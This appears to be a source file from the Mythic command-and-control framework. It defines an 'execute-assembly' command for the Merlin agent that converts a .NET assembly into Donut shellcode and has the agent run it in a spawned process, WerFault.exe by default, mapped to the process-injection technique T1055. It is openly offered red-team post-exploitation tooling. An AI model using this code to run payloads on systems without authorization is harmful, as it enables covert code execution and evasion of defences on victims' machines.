
from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicResponseRPC import *
from mythic_payloadtype_container.MythicFileRPC import *
import os
import json
import subprocess

# Set to enable debug output to Mythic
debug = False


class ExecuteAssemblyArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "assembly": CommandParameter(
                name="assembly",
                type=ParameterType.File,
                description="The .NET assembly you want to execute",
                ui_position=0,
                required=False,
            ),
            "arguments": CommandParameter(
                name="assembly arguments",
                type=ParameterType.String,
                description="Arguments to execute the .NET assembly with",
                ui_position=1,
                required=False,
            ),
            "spawnto": CommandParameter(
                name="spawnto",
                type=ParameterType.String,
                description="The child process that will be started to execute the assembly in",
                default_value="C:\\Windows\\System32\\WerFault.exe",
                ui_position=2,
                required=True,
            ),
            "spawntoargs": CommandParameter(
                name="spawnto arguments",
                type=ParameterType.String,
                description="Argument to create the spawnto process with, if any",
                ui_position=3,
                required=False,
            ),
        }

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
                self.add_arg("assembly_name", None, ParameterType.String)
            else:
                args = str.split(self.command_line)
                if len(args) > 0:
                    self.add_arg("assembly_name", args[0], ParameterType.String)
                if len(args) > 1:
                    self.add_arg("arguments", args[1], ParameterType.String)
                if len(args) > 2:
                    self.add_arg("spawnto", args[2], ParameterType.String)
                if len(args) > 3:
                    self.add_arg("spawntoargs", args[3], ParameterType.String)


class ExecuteAssemblyCommand(CommandBase):
    cmd = "execute-assembly"
    needs_admin = False
    help_cmd = "execute-assembly"
    description = "Convert a .NET assembly into shellcode with Donut, execute it in the spawnto process, and return the output"
    version = 1
    author = "@Ne0nd0g"
    argument_class = ExecuteAssemblyArguments
    attackmapping = ["T1055"]
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        supported_os=[SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        # Merlin jobs.MODULE
        task.args.add_arg("type", 16, ParameterType.Number)

        if task.args.get_arg("assembly") is not None:
            donut_assembly = task.args.get_arg("assembly")
            resp = await MythicFileRPC(task).get_file_by_name(json.loads(task.original_params)["assembly"])
            # Register the file with Mythic if it can't be found
            if resp.status == MythicStatus.Error:
                file_resp = await MythicFileRPC(task).register_file(
                    file=donut_assembly,
                    saved_file_name=json.loads(task.original_params)["assembly"],
                    delete_after_fetch=False,
                )
                if file_resp.status != MythicStatus.Success:
                    raise ValueError(
                        f'Failed to register file with Mythic: {file_resp.error_message}'
                    )
                else:
                    await MythicResponseRPC(task).user_output(f'Registered {file_resp.filename} '
                                                              f'SHA1: {file_resp.sha1} with Mythic')
        # See if the file has previously been registered with Mythic
        elif task.args.get_arg("assembly_name") is not None:
            resp = await MythicFileRPC(task).get_file_by_name(task.args.get_arg("assembly_name"))
            # Register the file
            if resp.status == MythicStatus.Success:
                donut_assembly = resp.contents
                await MythicResponseRPC(task).user_output(f'Using previously registered file {resp.filename}'
                                                          f' SHA1: {resp.sha1}')
            else:
                raise ValueError(
                    f'Failed to find file: {str.split(task.args.command_line)[0]}'
                )
        else:
            raise ValueError(
                f'A file or the name of a previously registered file was not provided'
            )

        # 1. Shellcode
        # 2. SpawnTo Executable
        # 3. SpawnTo Arguments (must include even if empty string)
        args = [
            donut(donut_assembly, task.args.get_arg("arguments")),
            task.args.get_arg("spawnto"),
            task.args.get_arg("spawntoargs")
        ]

        # Merlin jobs.Command message type
        command = {
            "command": "createprocess",
            "args": args,
        }

        task.display_params = f'{json.loads(task.original_params)["assembly"]} {task.args.get_arg("arguments")}\n ' \
                              f'spawnto: {task.args.get_arg("spawnto")} {task.args.get_arg("spawntoargs")}'

        task.args.add_arg("payload", json.dumps(command), ParameterType.String)
        task.args.remove_arg("assembly")
        task.args.remove_arg("arguments")
        task.args.remove_arg("spawnto")
        task.args.remove_arg("spawntoargs")

        if debug:
            await MythicResponseRPC(task).user_output(f'[DEBUG]Returned task:\r\n{task}\r\n')

        return task

    async def process_response(self, response: AgentResponse):
        pass


def donut(assembly, arguments):
    donut_args = ['go-donut', '--in', 'input.exe', '--exit', '2']
    if arguments:
        donut_args.append('--params')
        donut_args.append(arguments)

    # Write file to location in container
    with open('input.exe', 'wb') as w:
        w.write(assembly)

    result = subprocess.run(
        donut_args,
        stdout=subprocess.PIPE
    )

    donut_bytes = bytes
    # Read Donut output
    with open('loader.bin', 'rb') as output:
        donut_bytes = output.read()

    # Close files
    w.close()
    output.close()

    # Remove files
    os.remove("input.exe")
    os.remove("loader.bin")

    # Return Donut shellcode Base64 encoded
    return base64.b64encode(donut_bytes).decode("utf-8")

